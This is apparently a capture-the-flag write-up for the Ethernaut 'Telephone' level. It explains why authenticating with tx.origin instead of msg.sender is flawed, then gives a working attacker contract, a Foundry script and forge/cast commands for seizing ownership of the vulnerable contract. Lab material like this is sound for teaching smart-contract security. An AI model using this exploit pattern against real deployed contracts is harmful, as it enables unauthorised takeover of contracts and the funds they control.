**Level 04 - Telephone (Ethernaut)**
====================================

**Overview**
------------

This level teaches about **msg.sender vs tx.origin**.

The contract uses wrong authentication logic.

**Objective:**

Become the owner of the contract

## **Ethernaut Info**

Claim ownership of the contract below to complete this level.

  Things that might help

See the "?" page above, section "Beyond the console"

**Contract**
------------

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```


**Vulnerability**
-----------------

The problem is here:

```
if (tx.origin != msg.sender)
```

-   tx.origin = original user (your wallet)

-   msg.sender = caller of the function

If we call directly:

-   tx.origin == msg.sender → condition fails

So we need to call **through another contract**


**Attack Strategy**
-------------------

We must:

1.  Create attacker contract

2.  Call target contract from it

3.  Now:

    -   tx.origin = our wallet

    -   msg.sender = attacker contract

4.  Condition becomes true

5.  We become owner


**Exploit Steps**
-----------------

### **Method 1 --- Browser Console (Web3)**

#### **1\. Deploy attacker contract (Remix)**

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Attack {

    function attack(address target) public {
        ITelephone(target).changeOwner(msg.sender);
    }
}
```


#### **2\. Call attack function**

```
await attackContract.attack(contract.address)
```


#### **3\. Check owner**

```
await contract.owner()
```

Now you are the owner.


### **Method 2 --- Foundry**

#### **1\. Create script**

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Solve is Script {

    function run() external {
        address target = address(0x...);

        vm.startBroadcast();

        Attack attack = new Attack();
        attack.attack(target);

        vm.stopBroadcast();
    }
}

contract Attack {
    function attack(address target) public {
        ITelephone(target).changeOwner(msg.sender);
    }
}
```


#### **2\. Run script**

```
forge script script/Solve.s.sol --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast
```


#### **3\. Verify**

```
cast call $CONTRACT "owner()(address)"
```


**Why This Works**
------------------

-   tx.origin is always your wallet

-   msg.sender changes when using a contract

So:

```
tx.origin != msg.sender
```

becomes true

This allows ownership change


**Key Takeaways**
-----------------

-   Never use tx.origin for authentication

-   Always use msg.sender

-   Contracts can change call context

-   This can break security


**Tools**
---------

-   Browser console (web3)

-   Remix (for attacker contract)

-   Foundry (forge / cast)


**Summary**
-----------

The contract uses wrong check.

We:

-   call through another contract

-   change msg.sender

-   bypass condition

-   become owner
